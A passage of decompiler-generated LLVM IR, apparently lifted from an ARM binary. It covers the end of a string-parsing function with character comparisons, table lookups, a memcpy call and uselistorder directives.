  %v2_14c00 = add i32 %v0_14b9c, -36936
  store i32 %v2_14c00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c04

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14bfc
  %v1_14c18 = phi i32 [ %v1_14c88, %dec_label_pc_14c88 ], [ %v2_14c00, %dec_label_pc_14bfc ]
  %v1_14c04 = inttoptr i32 %v1_14c18 to i8*
  %v2_14c04 = load i8, i8* %v1_14c04, align 1
  %v3_14c04 = zext i8 %v2_14c04 to i32
  store i32 %v3_14c04, i32* %r3.global-to-local, align 4
  %v9_14c08 = icmp eq i8 %v2_14c04, %v2_14be8
  br i1 %v9_14c08, label %dec_label_pc_14c10, label %dec_label_pc_14c88

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14c04
  store i32 %v2_14c00, i32* %r3.global-to-local, align 4
  %v2_14c18 = sub i32 %v1_14c18, %v2_14c00
  store i32 %v2_14c18, i32* %r1.global-to-local, align 4
  %v7_14c20 = icmp slt i32 %v2_14c18, 18
  br i1 %v7_14c20, label %bb152, label %dec_label_pc_14c24

dec_label_pc_14c24:                               ; preds = %dec_label_pc_14c10
  %v1_14c24 = and i32 %v3_14bf4, 1024
  %v2_14c24 = icmp eq i32 %v1_14c24, 0
  br i1 %v2_14c24, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_14c24
  %v2_14c28 = add i32 %v2_14c18, -2
  store i32 %v2_14c28, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_14c10, %dec_label_pc_14c24, %bb151
  %v0_14c30 = phi i32 [ %v2_14c18, %dec_label_pc_14c10 ], [ %v2_14c18, %dec_label_pc_14c24 ], [ %v2_14c28, %bb151 ]
  store i32 -36984, i32* %r3.global-to-local, align 4
  %v1_14c30 = load i32, i32* %r7.global-to-local, align 4
  %v2_14c30 = add i32 %v1_14c30, 32
  %v3_14c30 = inttoptr i32 %v2_14c30 to i32*
  store i32 %v0_14c30, i32* %v3_14c30, align 4
  %v0_14c34 = load i32, i32* @lr, align 4
  %v1_14c34 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c34 = add i32 %v1_14c34, %v0_14c34
  store i32 %v2_14c34, i32* %r3.global-to-local, align 4
  %v1_14c38 = add i32 %v2_14c34, -1
  store i32 %v1_14c38, i32* %r0.global-to-local, align 4
  %v0_14c40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14c3c

dec_label_pc_14c3c:                               ; preds = %dec_label_pc_14c3c, %bb152
  %v0_14c3c = phi i32 [ %v1_14c3c, %dec_label_pc_14c3c ], [ %v1_14c38, %bb152 ]
  %v1_14c3c = add i32 %v0_14c3c, 1
  %v2_14c3c = inttoptr i32 %v1_14c3c to i8*
  %v3_14c3c = load i8, i8* %v2_14c3c, align 1
  %v4_14c3c = zext i8 %v3_14c3c to i32
  store i32 %v4_14c3c, i32* %r3.global-to-local, align 4
  store i32 %v1_14c3c, i32* %r0.global-to-local, align 4
  %v8_14c44 = icmp sgt i32 %v0_14c40.pre, %v4_14c3c
  br i1 %v8_14c44, label %dec_label_pc_14c3c, label %dec_label_pc_14c48

dec_label_pc_14c48:                               ; preds = %dec_label_pc_14c3c
  %v2_14c50.neg = sub i32 36984, %v0_14c34
  %v2_14c54 = add i32 %v2_14c50.neg, %v1_14c3c
  %v2_14c58 = mul i32 %v2_14c54, 2
  store i32 %v2_14c58, i32* %r2.global-to-local, align 4
  %v2_14c5c = add i32 %v0_14c34, -37000
  store i32 %v2_14c5c, i32* %r3.global-to-local, align 4
  %v2_14c60 = add i32 %v2_14c58, %v2_14c5c
  %v3_14c60 = inttoptr i32 %v2_14c60 to i16*
  %v4_14c60 = load i16, i16* %v3_14c60, align 2
  %v6_14c60 = sext i16 %v4_14c60 to i32
  store i32 %v6_14c60, i32* %r1.global-to-local, align 4
  %v2_14c68 = add i32 %v0_14c34, -37016
  store i32 %v2_14c68, i32* %r3.global-to-local, align 4
  %v2_14c6c = add i32 %v2_14c58, %v2_14c68
  %v3_14c6c = inttoptr i32 %v2_14c6c to i16*
  %v4_14c6c = load i16, i16* %v3_14c6c, align 2
  %v6_14c6c = sext i16 %v4_14c6c to i32
  %v1_14c70 = load i32, i32* @ip, align 4
  %v2_14c70 = or i32 %v1_14c70, %v6_14c60
  %v2_14c74 = and i32 %v2_14c70, %v6_14c6c
  store i32 %v2_14c74, i32* %r1.global-to-local, align 4
  store i32 -36936, i32* %r3.global-to-local, align 4
  %v2_14c7c = add i32 %v0_14c34, -36936
  store i32 %v2_14c7c, i32* %r0.global-to-local, align 4
  store i32 %v2_14c74, i32* %stack_var_-72, align 4
  %v0_14ca0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c94

dec_label_pc_14c88:                               ; preds = %dec_label_pc_14c04
  %v1_14c88 = add i32 %v1_14c18, 1
  %v2_14c88 = inttoptr i32 %v1_14c88 to i8*
  %v3_14c88 = load i8, i8* %v2_14c88, align 1
  %v4_14c88 = zext i8 %v3_14c88 to i32
  store i32 %v4_14c88, i32* %r3.global-to-local, align 4
  store i32 %v1_14c88, i32* %r0.global-to-local, align 4
  %v2_14c8c = icmp eq i8 %v3_14c88, 0
  br i1 %v2_14c8c, label %dec_label_pc_14c94, label %dec_label_pc_14c04

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14c48
  %v0_14ca0 = phi i32 [ %v0_14ca0.pre, %dec_label_pc_14c48 ], [ %v0_14be8, %dec_label_pc_14c88 ]
  %v0_14c9c = phi i32 [ %v1_14c70, %dec_label_pc_14c48 ], [ %v3_14bf4, %dec_label_pc_14c88 ]
  %v0_14c94 = load i32, i32* @r4, align 4
  %v1_14c94 = and i32 %v0_14c94, 4
  %v1_14c98 = and i32 %v0_14c94, -5
  store i32 %v1_14c98, i32* %r3.global-to-local, align 4
  %v1_14c9c = and i32 %v0_14c9c, 3840
  store i32 %v1_14c9c, i32* %r2.global-to-local, align 4
  %v1_14ca0 = inttoptr i32 %v0_14ca0 to i8*
  %v2_14ca0 = load i8, i8* %v1_14ca0, align 1
  %v3_14ca0 = zext i8 %v2_14ca0 to i32
  store i32 %v3_14ca0, i32* %r1.global-to-local, align 4
  %v2_14ca4 = or i32 %v1_14c98, %v1_14c9c
  store i32 %v2_14ca4, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_14c94, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_14cb0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14cb0 = add i32 %v1_14cb0, 20
  %v3_14cb0 = inttoptr i32 %v2_14cb0 to i32*
  store i32 %tmp181, i32* %v3_14cb0, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_14cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14cb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_14cb8 = add i32 %v1_14cb8, 12
  %v3_14cb8 = inttoptr i32 %v2_14cb8 to i32*
  store i32 %v0_14cb8, i32* %v3_14cb8, align 4
  %v0_14cbc = load i32, i32* %r7.global-to-local, align 4
  %v1_14cbc = add i32 %v0_14cbc, 4
  %v2_14cbc = inttoptr i32 %v1_14cbc to i32*
  %v3_14cbc = load i32, i32* @r5, align 4
  store i32 %v3_14cbc, i32* %v2_14cbc, align 4
  %v4_14cbc = add i32 %v0_14cbc, 8
  %v5_14cbc = inttoptr i32 %v4_14cbc to i32*
  %v6_14cbc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_14cbc, i32* %v5_14cbc, align 4
  %v0_14cc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14cc0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14cc0 = add i32 %v1_14cc0, 16
  %v3_14cc0 = inttoptr i32 %v2_14cc0 to i32*
  store i32 %v0_14cc0, i32* %v3_14cc0, align 4
  %v0_14cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14cc4 = load i32, i32* %r7.global-to-local, align 4
  %v2_14cc4 = add i32 %v1_14cc4, 28
  %v3_14cc4 = inttoptr i32 %v2_14cc4 to i32*
  store i32 %v0_14cc4, i32* %v3_14cc4, align 4
  %v0_14cc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_14cc8 = inttoptr i32 %v0_14cc8 to i8*
  %v2_14cc8 = load i8, i8* %v1_14cc8, align 1
  %v3_14cc8 = zext i8 %v2_14cc8 to i32
  store i32 %v3_14cc8, i32* %r2.global-to-local, align 4
  %v2_14ccc = icmp eq i8 %v2_14cc8, 0
  br i1 %v2_14ccc, label %dec_label_pc_14cd4, label %dec_label_pc_14d58

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14c94
  %v0_14cd4 = load i32, i32* %r6.global-to-local, align 4
  %v1_14cd4 = inttoptr i32 %v0_14cd4 to i8*
  %v2_14cd4 = load i8, i8* %v1_14cd4, align 1
  %v3_14cd4 = zext i8 %v2_14cd4 to i32
  store i32 %v3_14cd4, i32* %r3.global-to-local, align 4
  %v7_14cd8 = icmp eq i8 %v2_14cd4, 109
  br i1 %v7_14cd8, label %.thread28, label %dec_label_pc_14cec

.thread28:                                        ; preds = %dec_label_pc_14cd4
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_14ce0 = load i32, i32* %r7.global-to-local, align 4
  %v3_14ce0 = add i32 %v2_14ce0, 32
  %v4_14ce0 = inttoptr i32 %v3_14ce0 to i32*
  store i32 20, i32* %v4_14ce0, align 4
  %v1_14ce4 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ce4 = load i32, i32* %r7.global-to-local, align 4
  %v3_14ce4 = add i32 %v2_14ce4, 28
  %v4_14ce4 = inttoptr i32 %v3_14ce4 to i32*
  store i32 %v1_14ce4, i32* %v4_14ce4, align 4
  br label %dec_label_pc_14d58

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14cd4
  store i32 704, i32* %r3.global-to-local, align 4
  %v0_14cf0 = load i32, i32* @lr, align 4
  %v2_14cf0 = add i32 %v0_14cf0, 704
  %v3_14cf0 = inttoptr i32 %v2_14cf0 to i32*
  %v4_14cf0 = load i32, i32* %v3_14cf0, align 4
  store i32 %v4_14cf0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_14cf8 = load i32, i32* %r7.global-to-local, align 4
  %v2_14cf8 = add i32 %v1_14cf8, 32
  %v3_14cf8 = inttoptr i32 %v2_14cf8 to i32*
  store i32 21, i32* %v3_14cf8, align 4
  %v0_14cfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14cfc, i32* @ip, align 4
  %v1_14d00 = add i32 %v0_14cfc, 10
  store i32 %v1_14d00, i32* %r0.global-to-local, align 4
  %v0_14d08.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_14d08 = inttoptr i32 %v0_14d08.pre to i8*
  br label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14cec
  %v1_14d14 = phi i32 [ %v1_14d48, %dec_label_pc_14d48 ], [ %v0_14cfc, %dec_label_pc_14cec ]
  %v1_14d04 = inttoptr i32 %v1_14d14 to i8*
  %v2_14d04 = load i8, i8* %v1_14d04, align 1
  %v3_14d04 = zext i8 %v2_14d04 to i32
  store i32 %v3_14d04, i32* %r2.global-to-local, align 4
  %v2_14d08 = load i8, i8* %v1_14d08, align 1
  %v3_14d08 = zext i8 %v2_14d08 to i32
  store i32 %v3_14d08, i32* %r3.global-to-local, align 4
  %v9_14d0c = icmp eq i8 %v2_14d04, %v2_14d08
  br i1 %v9_14d0c, label %dec_label_pc_14d14, label %dec_label_pc_14d48

dec_label_pc_14d14:                               ; preds = %dec_label_pc_14d04
  %v2_14d14 = sub i32 %v1_14d14, %v0_14cfc
  store i32 %v2_14d14, i32* %r3.global-to-local, align 4
  %v0_14d1c = load i32, i32* %r7.global-to-local, align 4
  %v1_14d1c = add i32 %v0_14d1c, 4
  store i32 %v1_14d1c, i32* %r0.global-to-local, align 4
  %v0_14d20 = load i32, i32* @lr, align 4
  %v2_14d20 = add i32 %v0_14d20, 13216
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_14d28 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_14d28, i32* %r2.global-to-local, align 4
  %v4_14d2c = mul i32 %v2_14d14, 4
  %v5_14d2c = add i32 %v2_14d20, %v4_14d2c
  %v6_14d2c = inttoptr i32 %v5_14d2c to i32*
  %v7_14d2c = load i32, i32* %v6_14d2c, align 4
  store i32 %v7_14d2c, i32* @ip, align 4
  store i32 85304, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14d2c)
  %v0_14d38 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d3c = load i32, i32* %r7.global-to-local, align 4
  %v2_14d3c = add i32 %v1_14d3c, 28
  %v3_14d3c = inttoptr i32 %v2_14d3c to i32*
  store i32 %v0_14d38, i32* %v3_14d3c, align 4
  %v7_14d40 = icmp sgt i32 %v0_14d38, 5
  br i1 %v7_14d40, label %dec_label_pc_14e54, label %dec_label_pc_14d58

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d04
  %v1_14d48 = add i32 %v1_14d14, 1
  store i32 %v1_14d48, i32* %r1.global-to-local, align 4
  %v3_14d4c = icmp ult i32 %v1_14d48, %v1_14d00
  br i1 %v3_14d4c, label %dec_label_pc_14d04, label %dec_label_pc_14e54

dec_label_pc_14d58:                               ; preds = %.thread28, %dec_label_pc_14d14, %dec_label_pc_14c94
  %v0_14d58 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_14d58, 1
  br i1 %tmp156, label %dec_label_pc_14e04, label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d58
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_14d78 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_14d64

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14dec, %dec_label_pc_14d60
  %v9_14d84 = phi i32 [ 0, %dec_label_pc_14d60 ], [ %v1_14df0, %dec_label_pc_14dec ]
  %v7_14d68 = icmp sgt i32 %v9_14d84, 2
  br i1 %v7_14d68, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_14d64
  store i32 %v9_14d78, i32* %r3.global-to-local, align 4
  %v10_14d84 = add i32 %v9_14d84, %v9_14d78
  store i32 %v10_14d84, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_14d64
  store i32 %v3_149e0.pre-phi, i32* @ip, align 4
  %v12_14d6c = mul i32 %v9_14d84, 4
  %v13_14d6c = add i32 %v12_14d6c, %v3_149e0.pre-phi
  store i32 %v13_14d6c, i32* %r3.global-to-local, align 4
  %v9_14d74 = add i32 %v13_14d6c, -12
  %v10_14d74 = inttoptr i32 %v9_14d74 to i8*
  %v11_14d74 = load i8, i8* %v10_14d74, align 4
  %v12_14d74 = zext i8 %v11_14d74 to i32
  store i32 %v12_14d74, i32* %r2.global-to-local, align 4
  %v9_14d7c = load i32, i32* %r7.global-to-local, align 4
  %v10_14d7c = add i32 %v9_14d7c, %v9_14d84
  store i32 %v10_14d7c, i32* %r3.global-to-local, align 4
  store i32 %v12_14d74, i32* %r1.global-to-local, align 4
  %v11_14d88 = add i32 %v10_14d7c, 36
  %v12_14d88 = inttoptr i32 %v11_14d88 to i8*
  store i8 %v11_14d74, i8* %v12_14d88, align 1
  %v0_14d8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_14dac = phi i32 [ %v10_14d84, %.thread38 ], [ %v0_14d8c.pre, %bb157 ]
  %v1_14d8c = load i32, i32* %fp.global-to-local, align 4
  %v2_14d8c = sub i32 %v0_14dac, %v1_14d8c
  %v4_14d8c = xor i32 %v1_14d8c, %v0_14dac
  %v5_14d8c = xor i32 %v2_14d8c, %v0_14dac
  %v6_14d8c = and i32 %v5_14d8c, %v4_14d8c
  %v7_14d8c = icmp slt i32 %v6_14d8c, 0
  %v8_14d8c = icmp slt i32 %v2_14d8c, 0
  %v9_14d8c = icmp eq i32 %v0_14dac, %v1_14d8c
  %v3_14d90 = xor i1 %v8_14d8c, %v7_14d8c
  %v4_14d90 = or i1 %v9_14d8c, %v3_14d90
  br i1 %v4_14d90, label %dec_label_pc_14da0, label %dec_label_pc_14d94

dec_label_pc_14d94:                               ; preds = %bb158
  %v1_14d94 = add i32 %v0_14dac, -9
  %v3_14d94 = sub i32 8, %v0_14dac
  %v4_14d94 = and i32 %v3_14d94, %v0_14dac
  %v5_14d94 = icmp slt i32 %v4_14d94, 0
  %v6_14d94 = icmp slt i32 %v1_14d94, 0
  %v7_14d94 = icmp eq i32 %v0_14dac, 9
  %v3_14d98 = xor i1 %v6_14d94, %v5_14d94
  %v4_14d98 = or i1 %v7_14d94, %v3_14d98
  br i1 %v4_14d98, label %dec_label_pc_14d9c, label %dec_label_pc_14e54

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d94
  store i32 %v0_14dac, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14da0

dec_label_pc_14da0:                               ; preds = %bb158, %dec_label_pc_14d9c
  store i32 %v3_149e0.pre-phi, i32* @r2, align 4
  %v1_14da4 = load i32, i32* %r8.global-to-local, align 4
  %v4_14da4 = mul i32 %v1_14da4, 4
  %v5_14da4 = add i32 %v4_14da4, %v3_149e0.pre-phi
  store i32 %v5_14da4, i32* %sb.global-to-local, align 4
  %v1_14da8 = add i32 %v5_14da4, -40
  %v2_14da8 = inttoptr i32 %v1_14da8 to i32*
  %v3_14da8 = load i32, i32* %v2_14da8, align 4
  store i32 %v3_14da8, i32* %r5.global-to-local, align 4
  %v1_14dac = add i32 %v0_14dac, -1
  store i32 %v1_14dac, i32* %r3.global-to-local, align 4
  %v0_14db0 = load i32, i32* %r7.global-to-local, align 4
  %v4_14db0 = mul i32 %v1_14dac, 4
  %v5_14db0 = add i32 %v0_14db0, %v4_14db0
  store i32 %v5_14db0, i32* %sl.global-to-local, align 4
  %v7_14db4 = icmp eq i32 %v3_14da8, 8
  %v1_14db8 = add i32 %v5_14db0, 40
  %v2_14db8 = inttoptr i32 %v1_14db8 to i32*
  %v3_14db8 = load i32, i32* %v2_14db8, align 4
  store i32 %v3_14db8, i32* @r0, align 4
  br i1 %v7_14db4, label %dec_label_pc_14dec, label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14da0
  %v9_14dc0 = icmp eq i32 %v3_14db8, %v3_14da8
  br i1 %v9_14dc0, label %dec_label_pc_14de4, label %bb159

bb159:                                            ; preds = %dec_label_pc_14dc0
  %v8_14dc4 = icmp eq i32 %v3_14db8, 8
  br i1 %v8_14dc4, label %dec_label_pc_14de4, label %dec_label_pc_14dcc

dec_label_pc_14dcc:                               ; preds = %bb159
  %v0_14dcc = call i32 @_promoted_size()
  %v0_14dd4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14dd4, i32* @r0, align 4
  %v0_14dd8 = call i32 @_promoted_size()
  store i32 %v0_14dd8, i32* %r0.global-to-local, align 4
  %v8_14de0 = icmp sgt i32 %v0_14dcc, %v0_14dd8
  br i1 %v8_14de0, label %dec_label_pc_14dec, label %dec_label_pc_14dcc.dec_label_pc_14de4_crit_edge

dec_label_pc_14dcc.dec_label_pc_14de4_crit_edge:  ; preds = %dec_label_pc_14dcc
  %v0_14de4.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_14de8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14de4

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14dcc.dec_label_pc_14de4_crit_edge, %dec_label_pc_14dc0, %bb159
  %v1_14de8 = phi i32 [ %v1_14de8.pre, %dec_label_pc_14dcc.dec_label_pc_14de4_crit_edge ], [ %v5_14db0, %dec_label_pc_14dc0 ], [ %v5_14db0, %bb159 ]
  %v0_14de4 = phi i32 [ %v0_14de4.pre, %dec_label_pc_14dcc.dec_label_pc_14de4_crit_edge ], [ %v5_14da4, %dec_label_pc_14dc0 ], [ %v5_14da4, %bb159 ]
  %v1_14de4 = add i32 %v0_14de4, -40
  %v2_14de4 = inttoptr i32 %v1_14de4 to i32*
  %v3_14de4 = load i32, i32* %v2_14de4, align 4
  store i32 %v3_14de4, i32* %r3.global-to-local, align 4
  %v2_14de8 = add i32 %v1_14de8, 40
  %v3_14de8 = inttoptr i32 %v2_14de8 to i32*
  store i32 %v3_14de4, i32* %v3_14de8, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14dcc, %dec_label_pc_14da0, %dec_label_pc_14de4
  %v0_14dec = load i32, i32* %r7.global-to-local, align 4
  %v1_14dec = add i32 %v0_14dec, 28
  %v2_14dec = inttoptr i32 %v1_14dec to i32*
  %v3_14dec = load i32, i32* %v2_14dec, align 4
  %v0_14df0 = load i32, i32* %r8.global-to-local, align 4
  %v1_14df0 = add i32 %v0_14df0, 1
  store i32 %v1_14df0, i32* %r8.global-to-local, align 4
  %v1_14df4 = add i32 %v3_14dec, 2
  store i32 %v1_14df4, i32* %r3.global-to-local, align 4
  %v6_14dfc = icmp slt i32 %v1_14df0, %v1_14df4
  br i1 %v6_14dfc, label %dec_label_pc_14d64, label %dec_label_pc_14e20

dec_label_pc_14e04:                               ; preds = %dec_label_pc_14d58
  %v0_14e04 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e04 = add i32 %v0_14e04, 28
  %v2_14e04 = inttoptr i32 %v1_14e04 to i32*
  %v3_14e04 = load i32, i32* %v2_14e04, align 4
  store i32 %v3_14e04, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_14e0c = add i32 %v0_14e04, 38
  %v4_14e0c = inttoptr i32 %v3_14e0c to i8*
  store i8 1, i8* %v4_14e0c, align 1
  %v0_14e10 = load i32, i32* %r2.global-to-local, align 4
  %v3_14e10 = mul i32 %v0_14e10, 4
  store i32 %v3_14e10, i32* @r2, align 4
  %v0_14e14 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e14 = add i32 %v0_14e14, 40
  store i32 %v1_14e14, i32* @r0, align 4
  %v2_14e18 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_14e18, i32* @r1, align 4
  %v0_14e1c = call i32 @memcpy()
  store i32 %v0_14e1c, i32* %r0.global-to-local, align 4
  %v0_14e20.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14e20

dec_label_pc_14e20:                               ; preds = %dec_label_pc_14dec, %dec_label_pc_14e04
  %v2_14e3c = phi i32 [ %v0_14e20.pre, %dec_label_pc_14e04 ], [ %v0_14dec, %dec_label_pc_14dec ]
  %v1_14e20 = add i32 %v2_14e3c, 16
  %v2_14e20 = inttoptr i32 %v1_14e20 to i32*
  %v3_14e20 = load i32, i32* %v2_14e20, align 4
  store i32 %v3_14e20, i32* %r3.global-to-local, align 4
  %v1_14e24 = and i32 %v3_14e20, 128
  %v2_14e24 = icmp eq i32 %v1_14e24, 0
  br i1 %v2_14e24, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_14e20
  %v3_14e28 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_14e28, i32* %r3.global-to-local, align 4
  %v2_14e2c = inttoptr i32 %v2_14e3c to i32*
  %v3_14e2c = load i32, i32* %v2_14e2c, align 4
  %v2_14e34.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_14e34 = sub i32 %v2_14e34.pre, %v3_14e28
  store i32 %v3_14e34, i32* %r3.global-to-local, align 4
  %v5_14e38 = mul i32 %v3_14e34, 4
  %v6_14e38 = add i32 %v5_14e38, %v3_14e2c
  store i32 %v6_14e38, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_14e20
  %v1_14e3045 = load i32, i32* %r6.global-to-local, align 4
  %v2_14e3046 = add i32 %v1_14e3045, 1
  store i32 %v2_14e3046, i32* %r3.global-to-local, align 4
  %v3_14e3c = inttoptr i32 %v2_14e3c to i32*
  store i32 %v2_14e3046, i32* %v3_14e3c, align 4
  %v0_14e40.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_14e48 = phi i32 [ %v2_14e3c, %.thread48 ], [ %v0_14e40.pre, %.thread50 ]
  %v1_14e40 = add i32 %v1_14e48, 28
  %v2_14e40 = inttoptr i32 %v1_14e40 to i32*
  %v3_14e40 = load i32, i32* %v2_14e40, align 4
  store i32 %v3_14e40, i32* %r3.global-to-local, align 4
  %v1_14e44 = add i32 %v3_14e40, 2
  store i32 %v1_14e44, i32* %r0.global-to-local, align 4
  %v0_14e48 = load i32, i32* %fp.global-to-local, align 4
  %v2_14e48 = add i32 %v1_14e48, 24
  %v3_14e48 = inttoptr i32 %v2_14e48 to i32*
  store i32 %v0_14e48, i32* %v3_14e48, align 4
  br i1 %v2_14e24, label %dec_label_pc_14e58, label %bb161

bb161:                                            ; preds = %bb160
  %v1_14e4c = load i32, i32* @r2, align 4
  %v2_14e4c = load i32, i32* %r7.global-to-local, align 4
  %v3_14e4c = inttoptr i32 %v2_14e4c to i32*
  store i32 %v1_14e4c, i32* %v3_14e4c, align 4
  br label %dec_label_pc_14e58

dec_label_pc_14e54:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14968, %dec_label_pc_14ab0, %dec_label_pc_14b5c, %dec_label_pc_14b34, %dec_label_pc_14b40, %dec_label_pc_14a7c, %dec_label_pc_14d94, %dec_label_pc_14d14, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e58

dec_label_pc_14e58:                               ; preds = %bb161, %bb160, %dec_label_pc_14e54
  %v2_14e5c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14e5c, i32* @r4, align 4
  store i32 %v6_14924, i32* @r5, align 4
  store i32 %v27_14924, i32* @lr, align 4
  %v1_14e60 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14e60

; uselistorder directives
  uselistorder i32 %v3_14e34, { 1, 0 }
  uselistorder i32 %v1_14df0, { 1, 2, 0 }
  uselistorder i32 %v2_14d8c, { 1, 0 }
  uselistorder i32 %v1_14d8c, { 1, 0, 2 }
  uselistorder i32 %v0_14dac, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_14d84, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14d48, { 1, 2, 0 }
  uselistorder i32 %v0_14d38, { 1, 0 }
  uselistorder i32 %v1_14d14, { 1, 0, 2 }
  uselistorder i32 %v1_14c88, { 1, 2, 0 }
  uselistorder i32 %v1_14c70, { 1, 0 }
  uselistorder i32 %v2_14c58, { 2, 1, 0 }
  uselistorder i32 %v1_14c3c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14c34, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_14c18, { 1, 0, 2 }
  uselistorder i32 %v2_14c00, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14bf4, { 2, 1, 0 }
  uselistorder i32 %v1_14bb4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14ba4.pre, { 0, 2, 1 }
  uselistorder i32 %v2_14b80, { 1, 0 }
  uselistorder i32 %v5_14ae0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14ae0, { 1, 0 }
  uselistorder i32 %v0_14ae476, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_14a88, { 1, 0 }
  uselistorder i32 %v0_14aa8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_14a6c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_14a54, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_14a44, { 1, 0 }
  uselistorder i32 %v3_14a3c, { 0, 2, 1 }
  uselistorder i8 %v2_14a3c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14abc, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_14a00, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_149ec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_149d4, { 1, 0 }
  uselistorder i32 %v3_149e0.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_14988, { 0, 2, 1 }
  uselistorder i32 %v2_14974, { 1, 0, 2 }
  uselistorder i32 %v0_14928, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 18, 0, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20 }
  uselistorder i32* %r6.global-to-local, { 12, 11, 13, 9, 14, 0, 1, 15, 2, 10, 3, 4, 5, 6, 8, 16, 7 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 60, 51, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 17, 46, 49, 50, 47, 48, 52, 53, 54, 55, 56, 57, 58, 59 }
